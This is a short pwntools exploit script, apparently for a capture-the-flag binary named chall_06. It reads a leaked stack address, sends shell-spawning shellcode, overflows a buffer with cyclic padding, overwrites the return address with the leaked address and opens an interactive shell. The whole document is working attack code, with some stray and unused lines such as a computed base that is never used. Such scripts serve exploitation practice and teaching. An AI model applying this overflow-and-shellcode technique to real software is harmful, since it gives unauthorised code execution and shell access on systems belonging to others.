from pwn import *

p = process("./chall_06")
leak_output = p.recvuntil(b"I drink milk even though i'm lactose intolerant: ")
addr = p.recvline().strip()
addr
offset = 0x60-0x8
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = b"" + shellcode
p.sendline(payload)
base = int(addr, 16) - offset
# printfAddr = 0x5600867e41a8
# getAddr = 0x5600867e41a8
payload = cyclic(offset)
# payload += p64(leak_output)
payload += p64(int(addr, 16))
# payload += p64(printfAddr)
# payload += p64(getAddr)
p.sendline(payload)
# p.sendline(0x5600867e41ee)
p.interactive()